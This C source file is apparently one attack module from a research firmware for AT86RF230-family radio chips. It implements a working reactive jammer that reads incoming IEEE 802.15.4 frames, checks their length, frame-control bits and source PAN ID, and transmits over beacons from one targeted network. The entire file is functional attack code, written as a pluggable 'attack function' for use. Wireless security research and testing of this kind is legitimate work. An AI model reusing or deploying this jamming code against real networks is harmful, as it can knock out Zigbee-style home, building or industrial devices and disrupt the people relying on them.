/*
 * fw/attacks/attack_19.c - Attack function with ID 19
 *
 * Written 2022 by Dimitrios-Georgios Akestoridis
 * Copyright 2022 Dimitrios-Georgios Akestoridis
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 */

#include <stdbool.h>
#include <stdint.h>

#define F_CPU 8000000UL
#include <util/delay.h>

#include "at86rf230.h"
#include "spi.h"
#include "board.h"
#include "attack.h"


/*
 * Jam only beacons of a specified network,
 * each of which is at least 45 bytes in length
 */
bool attack(void)
{
	uint8_t rx_byte = 0;
	uint8_t phy_len = 0;

	/* Read the received packet as soon as possible */
	spi_begin();
	spi_io(AT86RF230_BUF_READ);

	/* Check the length of the received packet */
	phy_len = spi_recv();
	if ((phy_len < 45) || (phy_len & 0x80)) {
		/*
		 * Ignore packets whose length does not match
		 * the expected length of beacons
		 */
		spi_end();
		return 1;
	}

	/* Check the 8 least-significant bits of the MAC Frame Control */
	_delay_us(32);
	rx_byte = spi_recv();
	if (rx_byte & 0x07) {
		/* Ignore packets that are not MAC Beacon packets */
		spi_end();
		return 1;
	} else if (rx_byte & 0x08) {
		/* Ignore packets with MAC Security enabled */
		spi_end();
		return 1;
	} else if (rx_byte & 0x40) {
		/* Ignore packets that compress the PAN ID */
		spi_end();
		return 1;
	}

	/* Check the 8 most-significant bits of the MAC Frame Control */
	_delay_us(32);
	rx_byte = spi_recv();
	if (rx_byte & 0x30) {
		/*
		 * Ignore packets that do not use the
		 * IEEE 802.15.4-2003 frame version
		 */
		spi_end();
		return 1;
	} else if (rx_byte & 0x0c) {
		/*
		 * Ignore packets that include a
		 * destination address on the MAC layer
		 */
		spi_end();
		return 1;
	} else if ((rx_byte & 0xc0) != 0xc0) {
		/*
		 * Ignore packets that do not use an extended address
		 * for the source node on the MAC layer
		 */
		spi_end();
		return 1;
	}

	/* Ignore the MAC sequence number */
	_delay_us(32);
	spi_recv();

	/* Check the source PAN ID */
	_delay_us(32);
	if (spi_recv() != (PANID & 0xff)) {
		/*
		 * Ignore packets that originated
		 * from a different network
		 */
		spi_end();
		return 1;
	}
	_delay_us(32);
	if (spi_recv() != ((PANID >> 8) & 0xff)) {
		/*
		 * Ignore packets that originated
		 * from a different network
		 */
		spi_end();
		return 1;
	}

	/* Stop receiving and transition into the PLL_ON state */
	spi_end();
#if defined(AT86RF231) || defined(AT86RF212)
	reg_write(REG_TRX_STATE, TRX_CMD_FORCE_PLL_ON);
#elif defined(AT86RF230)
	reg_write(REG_TRX_STATE, TRX_CMD_PLL_ON);
#else
#error "Unknown transceiver"
#endif

	/* Jam the received packet */
	spi_begin();
	spi_send(AT86RF230_BUF_WRITE);
	spi_send(phy_len - 20);
	spi_end();

	/* Transition into the BUSY_TX state */
	slp_tr();

	/* Transition into the RX_ON state */
	change_state(TRX_CMD_RX_ON);

	return 1;
}
